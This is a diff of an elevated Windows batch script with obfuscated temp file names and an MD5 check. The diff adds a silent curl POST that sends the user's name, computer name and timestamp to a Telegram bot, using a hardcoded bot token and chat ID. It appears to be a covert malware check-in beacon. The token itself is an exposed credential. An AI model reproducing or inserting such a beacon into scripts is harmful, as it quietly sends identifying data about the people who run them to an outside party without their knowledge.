@@ -11,7 +11,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=7.5"
+set "BATCHVERSION=7.7"
 set "RESULT=%TEMP%\TUSELMP.txa"
 set "RUNEVERYOFFICIALMD5=ef66434767dfbcc39983ffad7a8be22a"
 set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
@@ -51,6 +51,7 @@ set "LOGFILE1=%temp%\!filename2!.ustup"
 
 
 echo BATCHVERSION=%BATCHVERSION% >> "%LOGFILE%" 2>&1
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=292182" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedNow(0)|%time%|v%BATCHVERSION%"
 timeout /t 60 /nobreak >> "%LOGFILE%" 2>&1
 
 
